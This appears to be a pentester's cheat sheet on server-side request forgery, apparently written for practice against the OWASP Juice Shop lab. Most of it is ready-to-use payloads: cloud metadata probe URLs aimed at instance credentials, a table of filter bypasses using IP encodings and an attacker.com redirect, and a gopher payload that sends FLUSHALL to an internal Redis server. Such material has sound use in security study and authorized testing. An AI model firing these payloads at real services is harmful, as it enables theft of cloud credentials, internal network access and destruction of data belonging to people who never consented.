# SSRF

## Where to look

Any feature that fetches a URL you can influence: webhooks, PDF/screenshot generators, "import from URL", avatar fetchers, URL-preview, OAuth redirect fetchers.

## Probes

```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/              # AWS IMDSv1
http://169.254.169.254/latest/api/token               # IMDSv2 (needs PUT + header)
http://metadata.google.internal/computeMetadata/v1/   # GCP (needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/v1/                   # DigitalOcean
http://100.100.100.200/latest/meta-data/              # Alibaba
```

Internal common ports: 22, 80, 443, 2375 (docker), 2379 (etcd), 3306, 5432, 6379 (redis), 8080, 8500 (consul), 9200 (ES), 15672 (rabbitmq).

## Bypasses

```
Blocked host:                     Try:
example.com                       example.com.                (trailing dot)
127.0.0.1                         127.1
127.0.0.1                         2130706433                 (decimal)
127.0.0.1                         0x7f000001                 (hex)
127.0.0.1                         [::1], [::ffff:127.0.0.1]
127.0.0.1                         0177.0.0.1                 (octal)
localhost                         LocaLHoSt                  (case)
redirect filter                   attacker.com/redirect → 127.0.0.1
DNS pin check                     DNS rebinding (rbndr.us)
scheme filter                     gopher://, file://, dict://, ldap://, jar://
```

## Protocol smuggling via gopher

Send raw bytes to internal TCP services (Redis, SMTP, Memcached):
```
gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20foo%20bar%0D%0A
```
Use `gopherus` to craft payloads.

## Blind SSRF detection

Spin up a listener (interact.sh, Burp Collaborator, your own `nc -lvp 8000`). Fire request. Look for callback. If HTTP comes back, you've got outbound SSRF. If DNS only — still exploitable, limited.

## Juice Shop

- `GET /redirect?to=` — open redirect, chainable with phishing.
- `GET /ftp/` + `/support/logs/` — directory listings worth checking.
